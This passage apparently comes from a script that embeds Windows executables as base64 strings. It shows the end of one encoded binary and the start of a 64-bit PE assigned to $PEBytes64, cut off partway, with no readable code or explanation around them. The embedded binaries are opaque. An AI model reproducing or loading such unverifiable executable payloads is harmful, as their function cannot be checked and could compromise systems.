zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBJQUVYUEFEMDBAWgAA7AM/Z2V0bG9jQD8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUJFP0FWbG9jYWxlQDJAWFoAACYAPz8wPyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBJQUVAWFoAABUGP3Vuc2hpZnRAPyRjb2RlY3Z0QERESEBzdGRAQFFCRUhBQUhQQUQxQUFQQURAWgAAEQA/PzA/JGJhc2ljX2lzdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVAUEFWPyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAMUBfTkBaABwAPz8wPyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFQFBBVj8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQDFAX05AWgADAD8/MD8kYmFzaWNfaW9zQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBASUFFQFhaAACZAj9jbGVhckA/JGJhc2ljX2lvc0BEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFBRVhIX05AWgDFBT9zcHV0Y0A/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFBRUhEQFoA5gQ/b3V0QD8kY29kZWN2dEBEREhAc3RkQEBRQkVIQUFIUEJEMUFBUEJEUEFEM0FBUEFEQFoAMAQ/aW5APyRjb2RlY3Z0QERESEBzdGRAQFFCRUhBQUhQQkQxQUFQQkRQQUQzQUFQQURAWgAAewA/PzE/JGJhc2ljX2lzdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBVQUVAWFoAAJEDP2ZsdXNoQD8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFBRUFBVjEyQFhaAA8BPz82PyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFQUFWMDFAUDZBQUFWMDFAQUFWMDFAQFpAWgAAfgA/PzE/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBVQUVAWFoAAJwFP3NldHN0YXRlQD8kYmFzaWNfaW9zQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFWEhfTkBaAAB1AD8/MT8kYmFzaWNfaW9zQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAVUFFQFhaAAA4Bj94c3B1dG5APyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBNQUVfSlBCRF9KQFoANQY/eHNnZXRuQD8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBATUFFX0pQQURfSkBaAKwFP3Nob3dtYW55Y0A/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQE1BRV9KWFoAgQA/PzE/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFVBRUBYWgAAawM/ZW5kbEBzdGRAQFlBQUFWPyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQDFAQUFWMjFAQFoAAJECP2Fsd2F5c19ub2NvbnZAY29kZWN2dF9iYXNlQHN0ZEBAUUJFX05YWgAAngE/X0RlY3JlZkBmYWNldEBsb2NhbGVAc3RkQEBRQUVQQVYxMjNAWFoA8wE/X0luY3JlZkBmYWNldEBsb2NhbGVAc3RkQEBRQUVYWFoAOgE/P0JpZEBsb2NhbGVAc3RkQEBRQUVJWFoAAE1TVkNQMTAwLmRsbAAA6gBFbmNvZGVQb2ludGVyAMoARGVjb2RlUG9pbnRlcgDsAkludGVybG9ja2VkRXhjaGFuZ2UAsgRTbGVlcADpAkludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlAADTAkhlYXBTZXRJbmZvcm1hdGlvbgAAwARUZXJtaW5hdGVQcm9jZXNzAADAAUdldEN1cnJlbnRQcm9jZXNzANMEVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAAC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"
    $PEBytes64 = "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